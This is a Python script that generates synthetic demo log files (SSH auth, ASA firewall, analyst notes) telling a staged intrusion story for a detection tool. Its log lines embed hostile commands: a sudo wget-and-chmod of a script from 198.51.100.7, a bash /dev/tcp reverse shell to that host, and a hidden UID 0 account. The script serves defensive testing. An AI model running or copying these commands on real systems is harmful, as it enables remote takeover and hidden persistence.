"""Write the all-in-one DEMO case files (data/demo_case/). The three files written here are SYNTHETIC.

The demo case = these three files + the REAL WitFoo firewall sample (data/samples/witfoo_sample_asa_lines.log).
The story reuses two addresses that really occur in that WitFoo log, so the case links across files:
  100.64.37.4      an outside address the real firewall log shows probing the DMZ (ML: malicious)
  10.187.253.125   a real DMZ server it probed; here it plays "web01", the SSH server

Synthetic story, 26 July 2024 (UTC):
  20:50-23:45  203.0.113.77 guesses SSH passwords slowly, one try every 5 minutes        -> slow_brute_force
  21:30-21:32  100.64.37.4 guesses 40 passwords in 2 minutes                             -> brute_force
  21:32:05     ... and logs in as "deploy"                                                -> brute_force_success
  21:32:20     deploy uses sudo to download and chmod a script from 198.51.100.7          -> privilege_after_login,
                                                                                             tool_download, Sigma
  21:33:05     web01 opens a reverse shell to 198.51.100.7:4444                           -> Sigma (2 rules), firewall
  21:35:00     a hidden root account "backup2" is created                                 -> Sigma
  21:40-21:41  web01 scans 20 internal servers on port 22 (looking for the next target)   -> host_scan
  normal noise: alice and bob log in from the office; bob mistypes his password once
  22:15, 22:20 analyst notes: helpdesk ticket from deploy; threat intel on 198.51.100.7

Usage:  .venv/Scripts/python scripts/make_demo_case.py
"""
from pathlib import Path

import pandas as pd

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "data" / "demo_case"
ATTACKER, SLOW, WEB01, C2 = "100.64.37.4", "203.0.113.77", "10.187.253.125", "198.51.100.7"
DAY = pd.Timestamp("2024-07-26T00:00:00Z")


def iso(t: pd.Timestamp) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def asa(t: pd.Timestamp) -> str:
    return "<164>" + t.strftime("%b %d %Y %H:%M:%S")


def at(hms: str) -> pd.Timestamp:
    return DAY + pd.Timedelta(hms)


def ssh_log() -> list[tuple[pd.Timestamp, str]]:
    rows, pid = [], 31000
    users = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git", "deploy"]
    for i in range(36):                                   # slow guessing, 1 try per 5 minutes
        t = at("20:50:00") + pd.Timedelta(minutes=5 * i)
        rows.append((t, f"web01 sshd[{pid + i}]: Failed password for root from {SLOW} port {40100 + i} ssh2"))
    pid += 100
    for i in range(40):                                   # fast guessing, every 3 seconds
        t = at("21:30:00") + pd.Timedelta(seconds=3 * i)
        u = users[i % 7]
        rows.append((t, f"web01 sshd[{pid + i}]: Invalid user {u} from {ATTACKER} port {51000 + i}"))
        rows.append((t + pd.Timedelta(seconds=1),
                     f"web01 sshd[{pid + i}]: Failed password for invalid user {u} from {ATTACKER} port {51000 + i} ssh2"))
    rows.append((at("21:32:05"), f"web01 sshd[{pid + 50}]: Accepted password for deploy from {ATTACKER} port 51122 ssh2"))
    rows.append((at("21:32:05"), f"web01 sshd[{pid + 50}]: pam_unix(sshd:session): session opened for user deploy by (uid=0)"))
    rows.append((at("21:32:20"), "web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; "
                                 f"COMMAND=/bin/sh -c wget http://{C2}/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh"))
    rows.append((at("21:33:04"), f"web01 bash[2211]: deploy ran: bash -i >& /dev/tcp/{C2}/4444 0>&1"))
    rows.append((at("21:35:00"), "web01 useradd[2300]: new user: name=backup2, UID=0, GID=0, home=/home/backup2, "
                                 "shell=/bin/bash"))
    office = [("alice", "10.0.0.21"), ("bob", "10.0.0.34"), ("alice", "10.0.0.21"), ("bob", "10.0.0.34"),
              ("carol", "10.0.0.45"), ("alice", "10.0.0.21"), ("dave", "10.0.0.52"), ("bob", "10.0.0.34")]
    for i, (u, ip) in enumerate(office):                  # normal office logins
        t = at("21:05:00") + pd.Timedelta(minutes=17 * i)
        if i == 3:                                        # bob mistypes once, then gets in
            rows.append((t - pd.Timedelta(seconds=20), f"web01 sshd[{pid + 200 + i}]: Failed password for {u} from {ip} port {42000 + i} ssh2"))
        rows.append((t, f"web01 sshd[{pid + 300 + i}]: Accepted publickey for {u} from {ip} port {42000 + i} ssh2"))
    return rows


def firewall_log() -> list[tuple[pd.Timestamp, str]]:
    rows = [(at("21:33:05"), f"%ASA-6-106100: access-list dmz-1_access_out permitted tcp dmz-1/{WEB01}(43512) -> "
                              f"outside/{C2}(4444) hit-cnt 1 first hit [0x0, 0x0]")]
    for i in range(20):                                   # web01 sweeps the internal network on port 22
        t = at("21:40:00") + pd.Timedelta(seconds=4 * i)
        rows.append((t, f"%ASA-4-106023: Deny tcp src dmz-1:{WEB01}/{45000 + i} dst inside:10.20.0.{10 + i}/22 "
                        f"by access-group \"dmz-1_access_in\" [0x0, 0x0]"))
    return rows


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    ssh = sorted(ssh_log())
    (OUT / "web01_auth.log").write_text("\n".join(f"{iso(t)} {m}" for t, m in ssh) + "\n", encoding="utf-8")
    fw = sorted(firewall_log())
    (OUT / "firewall_dmz_extra.log").write_text("\n".join(f"{asa(t)}: {m}" for t, m in fw) + "\n", encoding="utf-8")
    notes = [
        f"{iso(at('22:15:00'))} Helpdesk ticket 4471: user deploy reports their password was changed without their "
        "knowledge on web01 (10.187.253.125). Asked to reset it.",
        f"{iso(at('22:20:00'))} Threat intel check: {C2} is listed as a malware distribution server. "
        f"Seen in our logs: http://{C2}/x.sh",
        f"{iso(at('22:30:00'))} Note: {ATTACKER} also appears in earlier firewall denies against the DMZ.",
    ]
    (OUT / "analyst_notes.txt").write_text("SYNTHETIC DEMO NOTES\n" + "\n".join(notes) + "\n", encoding="utf-8")
    print(f"wrote {len(ssh)} SSH lines, {len(fw)} firewall lines, {len(notes)} notes to {OUT}")


if __name__ == "__main__":
    main()
